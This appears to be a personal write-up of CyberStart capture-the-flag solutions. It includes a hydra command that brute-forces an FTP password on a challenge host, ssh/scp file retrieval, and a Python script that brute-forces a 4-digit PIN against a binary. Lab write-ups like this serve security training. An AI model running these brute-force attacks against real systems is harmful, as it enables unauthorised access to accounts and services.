### Headquarters Base- Cyberstart

Here's a basic overview of how I got the solutions to the Cyberstart Challenges.

#### Level 1

C1 - noticed that his username contained 1986, his year of birth, giving away his age. Skills: Math, Observation.
C2 - were able to successfully spot that the email supposed to be from cloudnine bank had a misspelt domain name with two k's. Skills: Observation, Social Engineering
C3
C4
C5
C6
C7
C8
C9
C10
C11
C12

#### Level 8

W0088 - Konami code- type console.log() in console for it to listen, and then press the following keys: up, up, down, down, left, right, left, right, b, a. Flag was then revealed.

Hidra- 
first, crack the password with hydra:
$ hydra -l secure_user -P words.txt ftp://services.cyberprotection.agency -s 2121
yielded pw: mutineers
connect to ftp server:
ftp services.cyberprotection.agency 2121
after entering username and password, used ls to list files and "get FLAG.txt" to download the file.

#### Level 9 C06 - Mission Extension

connect to server via ssh, and find image files with the following:
$ find . -name '*' -exec file {} \; | grep -o -P '^.+: \w+ image'
Once I found the image, I had to exit the ssh connection to the server and establish an scp connection to download the file:

$ scp -P26041 9XtXpQhrht@54.229.163.112:./Contents/M5KDAN44 ~/

C11
Uploading the images to aperisolve showed that one had a zip file in it. Extracted it with binwalk -e, which yielded an ELF named "msg". Running it gave the flag. 

Level 9 C10: 
```python
import itertools
import os

numbers = '0123456789'
y = ''
for c in itertools.product(numbers, repeat = 4):
    pin = y+''.join(c)
    print(pin)
    os.system("./program-x86 " + pin)
```
